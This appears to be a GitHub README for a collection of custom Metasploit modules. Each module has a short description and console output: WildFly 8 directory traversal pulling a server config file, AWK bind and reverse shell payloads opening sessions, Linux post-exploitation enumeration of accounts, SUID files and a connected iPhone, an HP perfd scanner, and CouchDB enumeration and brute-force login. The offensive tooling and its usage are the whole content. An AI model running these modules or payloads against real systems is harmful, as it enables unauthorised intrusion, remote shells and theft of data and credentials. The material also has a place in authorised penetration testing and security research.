## Modules for metasploit
Some modules that I created for fun. :)

### wildfly_traversal.rb
WildFly 8 (JBossAS) Directory Traversal

Output:
```
msf > use auxiliary/scanner/http/wildfly_8_traversal
msf auxiliary(wildfly_8_traversal) > set RHOSTS 192.168.0.23
RHOSTS => 192.168.0.23
msf auxiliary(wildfly_8_traversal) > run

[*] Attempting to download: standalone\\configuration\\standalone.xml
[*] Server returns HTTP code: 200
[*] File saved in:
/home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wildfly_8_traversal) > head -10
/home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml
[*] exec: head -10
/home/espreto/.msf4/loot/20141126235426_default_192.168.0.23_wildfly.http_025501.xml

<?xml version='1.0' encoding='UTF-8'?>

<server xmlns="urn:jboss:domain:2.1">
    <extensions>
        <extension module="org.jboss.as.clustering.infinispan"/>
        <extension module="org.jboss.as.connector"/>
        <extension module="org.jboss.as.deployment-scanner"/>
        <extension module="org.jboss.as.ee"/>
        <extension module="org.jboss.as.ejb3"/>
        <extension module="org.jboss.as.jaxrs"/>
msf auxiliary(wildfly_8_traversal) >

```

---
### bind_awk.rb
Bind payload via AWK.

Output:
```
msf exploit(handler) > set PAYLOAD cmd/unix/bind_awk
PAYLOAD => cmd/unix/bind_awk
msf exploit(handler) > set RHOST 127.0.0.1
RHOST => 127.0.0.1
msf exploit(handler) > run

[*] Starting the payload handler...
[*] Started bind handler
[*] Command shell session 2 opened (127.0.0.1:50523 -> 127.0.0.1:4444) at 2014-10-14 14:02:27 -0300

id
uid=1000(blah) gid=1000(blah) groups=1000(blah)
```

---
### enum_devices_apple.rb
Script post-exploitation (linux).

Output:
```
msf post(enum_devices_apple) > run

[+] Info:
[+] 	Ubuntu 13.10
[+] 	Linux test 3.11.0-13-generic #20-Ubuntu SMP Wed Oct 23 07:38:26 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[+] Vendor ID: 0x05ac
[+] Product: iPhone 3GS
[+] Serial: 5b334d2..snip...
[+] Path: /run/user/1000/gfvs/afc:host=5b334d2..snip..
[-] Not mounted
[*] ID Vendor stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_852663.txt
[*] ID Product stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_576096.txt
[*] Serial number stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_144632.txt
[*] Post module execution completed
msf post(enum_devices_apple) >
```
Or:
```
msf post(enum_devices_apple) > run

[+] Info:
[+] 	Ubuntu 13.10  
[+] 	Linux test 3.11.0-13-generic #20-Ubuntu SMP Wed Oct 23 07:38:26 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[+] Vendor ID: 0x05ac
[+] Product: iPhone 3GS
[+] Serial: 5b334d2..snip..
[+] Path: /run/user/1000/gfvs/afc:host=5b334d2..snip..
[+] Files:

AirFair
Airlock
Books
com.apple.itdbprep.postprocess.lock
DCIM
Downloads
iTunes_Control
PhotoData
Photos
Podcasts
Purchases
Recordings
Safari

[*] ID Vendor stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_852663.txt
[*] ID Product stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_576096.txt
[*] Serial number stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_144632.txt
[*] Files stored in /home/espreto/.msf4/loot/20140416144541_default_192.168.0.137_linux.enum.syste_480674.txt
[*] Post module execution completed
msf post(enum_devices_apple) >
```

---
### enum_system.rb
Find for SUIDs and SGIDs in linux systems.

Output:
```
msf exploit(handler) > run

[*] Started reverse handler on 127.0.0.1:4444
[*] Starting the payload handler...
[*] Command shell session 5 opened (127.0.0.1:4444 -> 127.0.0.1:55287) at 2014-10-14 14:09:09 -0300

^Z
Background session 5? [y/N]  y
msf exploit(handler) > use post/linux/gather/enum_system
msf post(enum_system) > set SESSION 5
SESSION => 5
msf post(enum_system) > run

[+] Info:
[+] 	Ubuntu 12.04.5 LTS  
[+] 	Linux msfdevel 3.11.0-26-generic #45~precise1-Ubuntu SMP Tue Jul 15 04:04:35 UTC 2014 i686 i686 i386 GNU/Linux
[*] Linux version stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_368282.txt
[*] User accounts stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_741490.txt
[*] Installed Packages stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_362788.txt
[*] Running Services stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_321005.txt
[*] Cron jobs stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_182975.txt
[*] Disk info stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_961984.txt
[*] Logfiles stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_763543.txt
[*] Setuid/setgid files stored in /home/espreto/.msf4/loot/20141014140940_default_127.0.0.1_linux.enum.syste_505295.txt
[*] Post module execution completed
msf post(enum_system) >
```

---
### reverse_awk.rb
Reverse payload via AWK.

Output:
```
msf exploit(handler) > set PAYLOAD cmd/unix/reverse_awk
PAYLOAD => cmd/unix/reverse_awk
msf exploit(handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf exploit(handler) > run

[*] Started reverse handler on 127.0.0.1:4444
[*] Starting the payload handler...
[*] Command shell session 4 opened (127.0.0.1:4444 -> 127.0.0.1:55286) at 2014-10-14 14:06:15 -0300

id
uid=1000(blah) gid=1000(blah) groups=1000(blah)
```

---
### hp_enum_perfd.rb
HP Operations Manager Perfd Environment Scanner

Output:
```
msf auxiliary(hp_enum_perfd) > run

[+] 192.168.1.50:5227, Perfd server banner: Welcome to the perfd server. Hit <RETURN> to continue.
[*] 192.168.1.50:5227 - HP Ops Agent perfd u saved in: /home/espreto/.msf4/loot/20141013114321_blah44_192.168.1.50_hp.ops.agent.per_639769.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd i saved in: /home/espreto/.msf4/loot/20141013154622_blah44_192.168.1.50_hp.ops.agent.per_191505.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd p saved in: /home/espreto/.msf4/loot/20141013154624_blah44_192.168.1.50_hp.ops.agent.per_700482.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd a saved in: /home/espreto/.msf4/loot/20141013154625_blah44_192.168.1.50_hp.ops.agent.per_700091.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd g saved in: /home/espreto/.msf4/loot/20141013154626_blah44_192.168.1.50_hp.ops.agent.per_638440.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd l saved in: /home/espreto/.msf4/loot/20141013154627_blah44_192.168.1.50_hp.ops.agent.per_354406.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd T saved in: /home/espreto/.msf4/loot/20141013154628_blah44_192.168.1.50_hp.ops.agent.per_848307.txt
[*] 192.168.1.50:5227 - HP Ops Agent perfd A saved in: /home/espreto/.msf4/loot/20141013154630_blah44_192.168.1.50_hp.ops.agent.per_853753.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(hp_enum_perfd) >
```

---
### couchdb_enum.rb
Enum databases on CouchDB.

Output:
TODO

---
### couchdb_login.rb
Brute-force login on CouchDB.

Output:
TODO

---
